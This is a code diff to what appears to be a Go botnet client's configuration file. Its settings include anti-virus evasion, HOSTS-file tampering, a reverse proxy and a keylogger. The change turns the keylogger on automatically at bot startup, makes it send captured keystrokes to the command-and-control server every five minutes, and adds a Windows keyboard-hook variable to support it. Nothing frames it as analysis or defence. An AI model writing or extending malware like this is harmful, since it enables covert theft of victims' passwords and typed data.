@@ -7,6 +7,8 @@ package components
 import (
 	"os"
 	"syscall"
+
+	"github.com/AllenDang/w32"
 )
 
 //============================================================
@@ -78,8 +80,8 @@ var (
 	editHosts              = false                                                                                              //Edit the HOST file on lounch to preset settings
 	antiVirusBypass        = false                                                                                              //Helps hide from Anti-Virus Programs
 	procBlacklist          = false                                                                                              //Process names to exit if detected
-	autoKeylogger          = false                                                                                              //Run keylogger automaticly on bot startup
-	autoKeyloggerInterval  = 10                                                                                                 //Minutes to wait to send keylogs to C&C
+	autoKeylogger          = true                                                                                               //Run keylogger automaticly on bot startup
+	autoKeyloggerInterval  = 5                                                                                                  //Minutes to wait to send keylogs to C&C
 	autoReverseProxy       = false                                                                                              //To run the Reverse Proxy Server on startup
 	reverseProxyPort       = "8080"                                                                                             //Normal Port to run the server on
 	reverseProxyBackend    = "127.0.0.1:6060"                                                                                   //Backends to send proxyed data too. Supports Multi (127.0.0.1:8080,127.0.0.1:8181,....)
@@ -329,6 +331,7 @@ var (
 	myName         string
 	myInstallReg   string
 	dogTreat       int
+	keyboardHook   w32.HHOOK
 )
 
 // Useful and USELESS constants
